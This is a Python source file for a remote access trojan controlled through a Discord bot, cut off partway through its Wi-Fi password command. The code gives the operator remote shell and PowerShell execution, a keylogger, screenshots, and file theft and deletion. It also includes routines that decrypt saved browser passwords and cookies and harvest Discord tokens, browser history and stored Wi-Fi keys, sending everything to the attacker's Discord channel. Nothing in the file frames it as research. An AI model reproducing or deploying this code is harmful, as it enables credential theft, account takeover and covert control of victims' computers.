import discord
from discord.ext import commands
import os
import platform
import requests
import subprocess
import psutil
import json
import base64
import io
import zipfile
import shutil
import tempfile
import sqlite3
from PIL import ImageGrab
from pynput import keyboard
import threading
import time
from datetime import datetime
import ctypes
import winreg
import win32crypt
from Crypto.Cipher import AES
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

config = {
    "token": "YOUR_TOKEN",
    "prefix": "!",
    "owner": "YOUR_ID",
    "serverid": "YOUR_SERVER_ID"
}

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix=config["prefix"], intents=intents)

active_sessions = {}
current_directory = os.path.expanduser("~")
keylog_active = False
keylog_buffer = []

def get_pc_username():
    return os.getenv('USERNAME') or os.getenv('USER') or platform.node()

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except:
        return "Unknown"

async def create_session_channel(guild_id: int, pc_username: str):
    guild = bot.get_guild(int(guild_id))
    if not guild:
        print(f"Error: Could not find guild with ID {guild_id}")
        return None
    
    channel_name = f"session-{pc_username}".lower().replace(" ", "-")
    
    if pc_username in active_sessions:
        channel = guild.get_channel(active_sessions[pc_username])
        if channel:
            print(f"Session channel already exists: {channel.name}")
            return channel
    
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
    if existing_channel:
        active_sessions[pc_username] = existing_channel.id
        print(f"Found existing session channel: {channel_name}")
        return existing_channel
    
    try:
        category = discord.utils.get(guild.categories, name="Active Sessions")
        if not category:
            category = await guild.create_category("Active Sessions")
        
        channel = await guild.create_text_channel(
            channel_name,
            category=category,
            topic=f"Remote session for PC: {pc_username}"
        )
        
        active_sessions[pc_username] = channel.id
        
        ip_address = get_public_ip()
        await channel.send(f"🟢 **Session Started**\nPC Username: `{pc_username}`\nIP Address: `{ip_address}`\nConnected at: <t:{int(discord.utils.utcnow().timestamp())}:F>")
        
        print(f"Created new session channel: {channel_name}")
        return channel
        
    except Exception as e:
        print(f"Error creating channel: {e}")
        return None

async def close_session_channel(pc_username: str):
    if pc_username not in active_sessions:
        print(f"No active session found for {pc_username}")
        return
    
    channel_id = active_sessions[pc_username]
    channel = bot.get_channel(channel_id)
    
    if channel:
        try:
            await channel.send(f"🔴 **Session Ended**\nDisconnected at: <t:{int(discord.utils.utcnow().timestamp())}:F>")
            
            archived_category = discord.utils.get(channel.guild.categories, name="Archived Sessions")
            if not archived_category:
                archived_category = await channel.guild.create_category("Archived Sessions")
            
            await channel.edit(category=archived_category)
            
            del active_sessions[pc_username]
            print(f"Archived session channel for {pc_username}")
            
        except Exception as e:
            print(f"Error closing channel: {e}")

def on_key_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(str(key.char))
    except:
        keylog_buffer.append(f" [{str(key)}] ")

import re

def get_browser_paths():
    userprofile = os.environ.get("USERPROFILE", "")
    localappdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    browsers = {
        "Firefox": {
            "path": os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
            "type": "firefox"
        },
        "Edge": {
            "path": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
            "type": "chromium"
        },
        "Opera": {
            "path": os.path.join(appdata, "Opera Software", "Opera Stable"),
            "type": "chromium"
        },
        "Opera GX": {
            "path": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
            "type": "chromium"
        }
    }
    return browsers

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    try:
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        else:
            return CryptUnprotectData(buff).decode()
    except:
        return None

def get_master_key(path):
    try:
        if not os.path.exists(path): return None
        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read(): return None

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key)
        return master_key
    except:
        return None



def extract_discord_tokens_regex(text):
    tokens = []
    patterns = [
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
        r'mfa\.[\w-]{84}',
    ]
    for pattern in patterns:
        found = re.findall(pattern, text)
        tokens.extend(found)
    return tokens

@bot.event
async def on_ready():
    print(f'Bot logged in as {bot.user.name} (ID: {bot.user.id})')
    print(f'Connected to {len(bot.guilds)} guild(s)')
    
    pc_username = get_pc_username()
    channel = await create_session_channel(int(config["serverid"]), pc_username)
    if channel:
        print(f"Session channel ready: #{channel.name}")

@bot.command(name="session")
async def session_command(ctx, action: str = None, pc_name: str = None):
    if str(ctx.author.id) != config["owner"]:
        await ctx.send("❌ You don't have permission to use this command.")
        return
    
    if action == "create" and pc_name:
        channel = await create_session_channel(ctx.guild.id, pc_name)
        if channel:
            await ctx.send(f"✅ Created session channel: {channel.mention}")
        else:
            await ctx.send("❌ Failed to create session channel.")
    
    elif action == "close" and pc_name:
        await close_session_channel(pc_name)
        await ctx.send(f"✅ Closed session for `{pc_name}`")
    
    elif action == "list":
        if not active_sessions:
            await ctx.send("📋 No active sessions.")
        else:
            session_list = "\n".join([f"• `{pc}` - <#{channel_id}>" for pc, channel_id in active_sessions.items()])
            await ctx.send(f"📋 **Active Sessions:**\n{session_list}")
    
    else:
        await ctx.send("Usage: `!session [create|close|list] [pc_username]`")

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"🏓 Pong! Latency: {round(bot.latency * 1000)}ms")

@bot.command(name="sysinfo")
async def sysinfo(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        info = f"""```
💻 System Information
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {platform.node()}
Username: {get_pc_username()}

CPU Cores: {psutil.cpu_count(logical=False)} Physical, {psutil.cpu_count()} Logical
CPU Usage: {psutil.cpu_percent()}%
RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
RAM Usage: {psutil.virtual_memory().percent}%
Disk: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB
Disk Usage: {psutil.disk_usage('/').percent}%
```"""
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="processes")
async def processes(ctx, limit: int = 15):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        procs = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                procs.append(proc.info)
            except:
                pass
        
        procs = sorted(procs, key=lambda x: x['memory_percent'], reverse=True)[:limit]
        
        output = "```\n📊 Top Processes\n━━━━━━━━━━━━━━━━━━━━━━\n"
        for p in procs:
            output += f"PID: {p['pid']} | {p['name'][:30]} | MEM: {p['memory_percent']:.1f}%\n"
        output += "```"
        
        await ctx.send(output)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="network")
async def network(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        ip = get_public_ip()
        hostname = platform.node()
        
        info = f"""```
🌐 Network Information
━━━━━━━━━━━━━━━━━━━━━━
Public IP: {ip}
Hostname: {hostname}
```"""
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="hwid")
async def hwid(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        output = subprocess.check_output("wmic csproduct get uuid", shell=True).decode()
        hwid = output.split('\n')[1].strip()
        await ctx.send(f"```\n🔑 Hardware ID\n━━━━━━━━━━━━━━\n{hwid}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="cd")
async def cd(ctx, *, path: str = None):
    global current_directory
    if str(ctx.author.id) != config["owner"]:
        return
    
    if not path:
        await ctx.send(f"📂 Current directory: `{current_directory}`")
        return
    
    try:
        if path == "..":
            current_directory = os.path.dirname(current_directory)
        elif path == "~":
            current_directory = os.path.expanduser("~")
        elif os.path.isabs(path):
            if os.path.exists(path):
                current_directory = path
            else:
                await ctx.send(f"❌ Path does not exist: `{path}`")
                return
        else:
            new_path = os.path.join(current_directory, path)
            if os.path.exists(new_path):
                current_directory = os.path.abspath(new_path)
            else:
                await ctx.send(f"❌ Path does not exist: `{path}`")
                return
        
        await ctx.send(f"✅ Changed directory to: `{current_directory}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="ls")
async def ls(ctx, *, path: str = None):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        target_path = current_directory if not path else path
        if not os.path.isabs(target_path) and path:
            target_path = os.path.join(current_directory, path)
        
        if not os.path.exists(target_path):
            await ctx.send(f"❌ Path does not exist: `{target_path}`")
            return
        
        items = os.listdir(target_path)
        
        dirs = [f"📁 {item}" for item in items if os.path.isdir(os.path.join(target_path, item))]
        files = [f"📄 {item}" for item in items if os.path.isfile(os.path.join(target_path, item))]
        
        output = f"```\n📂 {target_path}\n━━━━━━━━━━━━━━━━━━━━━━\n"
        
        all_items = dirs + files
        if len(all_items) > 50:
            output += "\n".join(all_items[:50])
            output += f"\n\n... and {len(all_items) - 50} more items"
        else:
            output += "\n".join(all_items) if all_items else "(empty)"
        
        output += "\n```"
        
        await ctx.send(output)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="download")
async def download(ctx, *, file_path: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        if not os.path.isabs(file_path):
            file_path = os.path.join(current_directory, file_path)
        
        if not os.path.exists(file_path):
            await ctx.send(f"❌ File not found: `{file_path}`")
            return
        
        file_size = os.path.getsize(file_path)
        if file_size > 8 * 1024 * 1024:
            await ctx.send(f"❌ File too large ({file_size / (1024**2):.2f} MB). Max 8MB.")
            return
        
        await ctx.send(file=discord.File(file_path))
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="upload")
async def upload(ctx, url: str, *, filename: str = None):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        
        if not filename:
            filename = url.split('/')[-1] or "downloaded_file"
        
        target_path = os.path.join(current_directory, filename)
        
        with open(target_path, 'wb') as f:
            f.write(response.content)
        
        await ctx.send(f"✅ File uploaded to: `{target_path}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="delete")
async def delete(ctx, *, file_path: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        if not os.path.isabs(file_path):
            file_path = os.path.join(current_directory, file_path)
        
        if not os.path.exists(file_path):
            await ctx.send(f"❌ File not found: `{file_path}`")
            return
        
        if os.path.isfile(file_path):
            os.remove(file_path)
            await ctx.send(f"✅ Deleted file: `{file_path}`")
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
            await ctx.send(f"✅ Deleted directory: `{file_path}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="find")
async def find(ctx, *, filename: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        await ctx.send(f"🔍 Searching for `{filename}`...")
        
        found = []
        for root, dirs, files in os.walk(current_directory):
            for file in files:
                if filename.lower() in file.lower():
                    found.append(os.path.join(root, file))
                    if len(found) >= 20:
                        break
            if len(found) >= 20:
                break
        
        if found:
            output = f"```\n🔍 Found {len(found)} result(s):\n━━━━━━━━━━━━━━━━━━━━━━\n"
            output += "\n".join(found[:20])
            output += "\n```"
            await ctx.send(output)
        else:
            await ctx.send(f"❌ No files found matching: `{filename}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="zip")
async def zip_folder(ctx, *, path: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        if not os.path.isabs(path):
            path = os.path.join(current_directory, path)
        
        if not os.path.exists(path):
            await ctx.send(f"❌ Path not found: `{path}`")
            return
        
        zip_filename = f"{os.path.basename(path)}.zip"
        zip_path = os.path.join(tempfile.gettempdir(), zip_filename)
        
        shutil.make_archive(zip_path[:-4], 'zip', path)
        
        if os.path.getsize(zip_path) > 8 * 1024 * 1024:
            os.remove(zip_path)
            await ctx.send(f"❌ Zip file too large (>8MB)")
            return
        
        await ctx.send(file=discord.File(zip_path))
        os.remove(zip_path)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="screenshot")
async def screenshot(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        screenshot = ImageGrab.grab()
        
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        
        await ctx.send(file=discord.File(img_bytes, filename=f"screenshot_{int(time.time())}.png"))
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="keylog")
async def keylog(ctx, action: str = None):
    global keylog_active, keylog_buffer
    if str(ctx.author.id) != config["owner"]:
        return
    
    if action == "start":
        if keylog_active:
            await ctx.send("⚠️ Keylogger already running")
            return
        
        keylog_active = True
        keylog_buffer = []
        
        listener = keyboard.Listener(on_press=on_key_press)
        listener.start()
        
        await ctx.send("✅ Keylogger started")
    
    elif action == "stop":
        if not keylog_active:
            await ctx.send("⚠️ Keylogger not running")
            return
        
        keylog_active = False
        await ctx.send("✅ Keylogger stopped")
    
    elif action == "dump":
        if not keylog_buffer:
            await ctx.send("❌ No keylog data")
            return
        
        log_data = ''.join(keylog_buffer)
        
        if len(log_data) > 1900:
            log_file = io.BytesIO(log_data.encode())
            await ctx.send(file=discord.File(log_file, filename=f"keylog_{int(time.time())}.txt"))
        else:
            await ctx.send(f"```\n{log_data}\n```")
    
    else:
        await ctx.send("Usage: `!keylog [start|stop|dump]`")

@bot.command(name="shell")
async def shell(ctx, *, command: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            cwd=current_directory,
            timeout=30
        )
        
        output = result.stdout + result.stderr
        
        if not output:
            output = "Command executed successfully (no output)"
        
        if len(output) > 1900:
            output_file = io.BytesIO(output.encode())
            await ctx.send(file=discord.File(output_file, filename="output.txt"))
        else:
            await ctx.send(f"```\n{output}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send("❌ Command timed out (>30s)")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="powershell")
async def powershell(ctx, *, command: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True,
            cwd=current_directory,
            timeout=30
        )
        
        output = result.stdout + result.stderr
        
        if not output:
            output = "Command executed successfully (no output)"
        
        if len(output) > 1900:
            output_file = io.BytesIO(output.encode())
            await ctx.send(file=discord.File(output_file, filename="output.txt"))
        else:
            await ctx.send(f"```\n{output}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send("❌ Command timed out (>30s)")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="kill")
async def kill(ctx, process_name: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        killed = 0
        for proc in psutil.process_iter(['name']):
            if process_name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        
        if killed:
            await ctx.send(f"✅ Killed {killed} process(es) matching `{process_name}`")
        else:
            await ctx.send(f"❌ No processes found matching `{process_name}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="lock")
async def lock(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        ctypes.windll.user32.LockWorkStation()
        await ctx.send("🔒 Workstation locked")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="shutdown")
async def shutdown(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    await ctx.send("⚠️ Shutting down system...")
    subprocess.run("shutdown /s /t 0", shell=True)

@bot.command(name="restart")
async def restart(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    await ctx.send("⚠️ Restarting system...")
    subprocess.run("shutdown /r /t 0", shell=True)

@bot.command(name="passwords")
async def passwords(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    await ctx.send("🔍 Extracting passwords from all browsers...")
    
    all_passwords = []
    userprofile = os.environ.get("USERPROFILE", "")
    localappdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    
    chromium_browsers = {
        "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "Yandex": os.path.join(localappdata, "Yandex", "YandexBrowser", "User Data"),
    }
    
    for browser_name, browser_path in chromium_browsers.items():
        try:
            if not os.path.exists(browser_path): continue
            
            master_key = get_master_key(browser_path)
            if not master_key: continue
            
            # Check Default and other profiles
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
            
            for profile in profiles:
                login_db = os.path.join(browser_path, profile, "Login Data")
                if not os.path.exists(login_db): continue
                
                temp_db = os.path.join(tempfile.gettempdir(), f"LoginData_{browser_name}_{profile}.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = DecryptValue(encrypted_password, master_key)
                        
                        if username or decrypted_password:
                            all_passwords.append(f"[{browser_name} - {profile}]\nURL: {url}\nUser: {username}\nPass: {decrypted_password}\n{'─'*40}")
                    
                    cursor.close()
                    conn.close()
                except: pass
                finally:
                   try: os.remove(temp_db)
                   except: pass
        except Exception as e:
            continue
    
    # Firefox
    try:
        firefox_path = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                try:
                    profile_path = os.path.join(firefox_path, profile)
                    if not os.path.isdir(profile_path): continue
                        
                    logins_json = os.path.join(profile_path, "logins.json")
                    signons_sqlite = os.path.join(profile_path, "signons.sqlite")
                    
                    if os.path.exists(logins_json):
                        try:
                            with open(logins_json, 'r', encoding='utf-8') as f:
                                data = json.load(f)
                                logins = data.get('logins', [])
                                for login in logins:
                                    url = login.get('hostname', 'N/A')
                                    username = login.get('usernameField', 'N/A')
                                    all_passwords.append(f"[Firefox]\nURL: {url}\nUser: {username}\nPass: [Encrypted - Full access required]\n{'─'*40}")
                        except: pass
                    
                    if os.path.exists(signons_sqlite):
                        try:
                            temp_db = os.path.join(tempfile.gettempdir(), f"signons_{profile}.db")
                            shutil.copy2(signons_sqlite, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
                            for row in cursor.fetchall():
                                url = row[0] if row[0] else 'N/A'
                                all_passwords.append(f"[Firefox]\nURL: {url}\nUser: [Encrypted]\nPass: [Encrypted - Full access required]\n{'─'*40}")
                            cursor.close()
                            conn.close()
                            os.remove(temp_db)
                        except: pass
                except: pass
    except: pass
    
    if all_passwords:
        output = "\n".join(all_passwords)
        output_file = io.BytesIO(output.encode())
        await ctx.send(file=discord.File(output_file, filename="passwords_all_browsers.txt"))
    else:
        await ctx.send("❌ No passwords found in any browser")

@bot.command(name="cookies")
async def cookies(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    await ctx.send("🔍 Extracting cookies from all browsers...")
    
    all_cookies = []
    userprofile = os.environ.get("USERPROFILE", "")
    localappdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    
    chromium_browsers = {
        "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "Yandex": os.path.join(localappdata, "Yandex", "YandexBrowser", "User Data"),
    }
    
    for browser_name, browser_path in chromium_browsers.items():
        try:
            if not os.path.exists(browser_path): continue
            
            master_key = get_master_key(browser_path)
            if not master_key: continue
            
            profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
            
            for profile in profiles:
                cookies_path = os.path.join(browser_path, profile, "Network", "Cookies")
                if not os.path.exists(cookies_path):
                     cookies_path = os.path.join(browser_path, profile, "Cookies")
                     if not os.path.exists(cookies_path): continue

                temp_db = os.path.join(tempfile.gettempdir(), f"Cookies_{browser_name}_{profile}.db")
                try:
                    shutil.copy2(cookies_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 200")
                    
                    for row in cursor.fetchall():
                        host = row[0]
                        name = row[1]
                        value = row[2]
                        encrypted_value = row[3]
                        
                        if encrypted_value:
                            decrypted = DecryptValue(encrypted_value, master_key)
                            if decrypted: value = decrypted
                        
                        if value:
                            display_value = value[:80] + "..." if len(value) > 80 else value
                            all_cookies.append(f"[{browser_name} - {profile}]\nHost: {host}\nName: {name}\nValue: {display_value}\n{'─'*40}")
                    
                    cursor.close()
                    conn.close()
                except: pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
        except Exception as e:
            continue

    try:
        firefox_path = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                try:
                    profile_path = os.path.join(firefox_path, profile)
                    cookies_db = os.path.join(profile_path, "cookies.sqlite")
                    if os.path.exists(cookies_db):
                        temp_db = os.path.join(tempfile.gettempdir(), f"Cookies_Firefox_{profile}.db")
                        shutil.copy2(cookies_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 200")
                        for row in cursor.fetchall():
                            host = row[0]
                            name = row[1]
                            value = row[2]
                            display_value = value[:80] + "..." if len(value) > 80 else value
                            all_cookies.append(f"[Firefox]\nHost: {host}\nName: {name}\nValue: {display_value}\n{'─'*40}")
                        cursor.close()
                        conn.close()
                        os.remove(temp_db)
                except: pass
    except: pass
    
    if all_cookies:
        output = "\n".join(all_cookies)
        output_file = io.BytesIO(output.encode())
        await ctx.send(file=discord.File(output_file, filename="cookies_all_browsers.txt"))
    else:
        await ctx.send("❌ No cookies found in any browser")

@bot.command(name="history")
async def history(ctx, limit: int = 50):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        history_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        
        if not os.path.exists(history_db):
            await ctx.send("❌ Chrome History not found")
            return
        
        temp_db = os.path.join(tempfile.gettempdir(), "History.db")
        shutil.copy2(history_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(f"SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT {limit}")
        
        history_data = []
        for row in cursor.fetchall():
            history_data.append(f"URL: {row[0]}\nTitle: {row[1]}\nVisits: {row[2]}\n{'─'*40}")
        
        cursor.close()
        conn.close()
        os.remove(temp_db)
        
        if history_data:
            output = "\n".join(history_data)
            output_file = io.BytesIO(output.encode())
            await ctx.send(file=discord.File(output_file, filename="history.txt"))
        else:
            await ctx.send("❌ No history found")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="tokens")
async def tokens(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    await ctx.send("🔍 Extracting Discord tokens (Encrypted & Plaintext)...")
    
    all_tokens = set()
    roaming = os.getenv("APPDATA")
    local = os.getenv("LOCALAPPDATA")
    
    discordPaths = [
        [f"{roaming}\Discord", "\Local Storage\leveldb"],
        [f"{roaming}\Lightcord", "\Local Storage\leveldb"],
        [f"{roaming}\discordcanary", "\Local Storage\leveldb"],
        [f"{roaming}\discordptb", "\Local Storage\leveldb"],
        [f"{roaming}\DiscordDevelopment", "\Local Storage\leveldb"],
    ]
    
    for patt in discordPaths:
        try:
            path = patt[0]
            if not os.path.exists(path + "\Local State"): continue
            
            pathC = path + patt[1]
            if not os.path.exists(pathC): continue

            with open(path + "\Local State", 'r', encoding='utf-8') as f: local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = CryptUnprotectData(master_key[5:])
            
            for file in os.listdir(pathC):
                if file.endswith(".log") or file.endswith(".ldb"):
                    try:
                        with open(f"{pathC}\{file}", "r", errors="ignore") as f:
                            lines = f.readlines()
                            for line in lines:
                                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                    try:
                                        tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if tokenDecoded:
                                            all_tokens.add(tokenDecoded)
                                    except:
                                        pass
                                tokens = extract_discord_tokens_regex(line)
                                all_tokens.update(tokens)
                    except:
                        pass
        except:
             pass

    try:
        chromium_browsers = {
            "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
            "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
            "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
        }
        
        for browser_name, browser_path in chromium_browsers.items():
            if not os.path.exists(browser_path): continue
            
            for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
                leveldb_path = os.path.join(browser_path, profile, "Local Storage", "leveldb")
                if os.path.exists(leveldb_path):
                    try:
                        for file_name in os.listdir(leveldb_path):
                            if file_name.endswith(".log") or file_name.endswith(".ldb"):
                                try:
                                    with open(os.path.join(leveldb_path, file_name), 'r', errors='ignore') as f:
                                        content = f.read()
                                        tokens = extract_discord_tokens_regex(content)
                                        all_tokens.update(tokens)
                                except: pass
                    except: pass
    except: pass

    try:
        firefox_path = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile)
                if not os.path.isdir(profile_path): continue
                
                local_storage_db = os.path.join(profile_path, "webappsstore.sqlite")
                if os.path.exists(local_storage_db):
                    try:
                        temp_db = os.path.join(tempfile.gettempdir(), f"webappsstore_{profile}.db")
                        shutil.copy2(local_storage_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT key, value FROM webappsstore WHERE originKey LIKE '%discord%'")
                        for row in cursor.fetchall():
                            if row[0]: all_tokens.update(extract_discord_tokens_regex(row[0]))
                            if row[1]: all_tokens.update(extract_discord_tokens_regex(row[1]))
                        cursor.close()
                        conn.close()
                        os.remove(temp_db)
                    except: pass
                        
                sessionstore_paths = [
                    os.path.join(profile_path, "sessionstore.jsonlz4"),
                    os.path.join(profile_path, "sessionstore-backups", "recovery.jsonlz4"),
                ]
                for sessionstore_path in sessionstore_paths:
                    if os.path.exists(sessionstore_path):
                        try:
                            with open(sessionstore_path, 'rb') as f:
                                content = f.read().decode('utf-8', errors='ignore')
                                tokens = extract_discord_tokens_regex(content)
                                all_tokens.update(tokens)
                        except: pass
    except: pass
    
    if all_tokens:
        tokens_list = sorted(list(all_tokens))
        output = "\n".join([f"Token {i+1}: {token}" for i, token in enumerate(tokens_list)])
        output_file = io.BytesIO(output.encode())
        await ctx.send(file=discord.File(output_file, filename="discord_tokens.txt"))
        await ctx.send(f"✅ Found {len(tokens_list)} unique Discord token(s)")
    else:
        await ctx.send("❌ No Discord tokens found")

@bot.command(name="wifi")
async def wifi(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True,
            text=True
        )
        
        profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
        
        wifi_data = []
        for profile in profiles:
            result = subprocess.run(
                ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                capture_output=True,
                text=True
            )
            
            password = "None"
            for line in result.stdout.split('\n'):
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
            
            wifi_data.append(f"SSID: {profile}\nPassword: {password}\n{'─'*40}")
        
        if wifi_data:
            output = "\n".join(wifi_data)
